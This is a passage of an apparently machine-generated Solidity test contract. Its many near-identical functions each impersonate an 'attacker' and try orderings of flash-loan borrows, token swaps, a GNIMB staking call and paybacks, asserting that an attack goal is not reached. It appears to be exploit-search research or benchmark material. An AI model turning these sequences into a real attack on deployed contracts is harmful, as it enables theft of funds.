        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1241(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1242(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1243(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1244(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1245(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1246(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1247(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1248(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1249(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1250(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1251(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1252(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1253(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1254(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1255(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1256(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1257(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1258(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1259(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1260(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1261(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1262(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1263(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1264(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1265(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1266(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1267(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1268(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1269(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1270(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1271(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1272(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1273(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1274(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1275(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1276(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1277(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1278(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1279(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1280(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1281(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1282(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1283(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1284(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1285(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1286(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1287(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1288(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1289(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1290(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1291(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1292(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1293(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
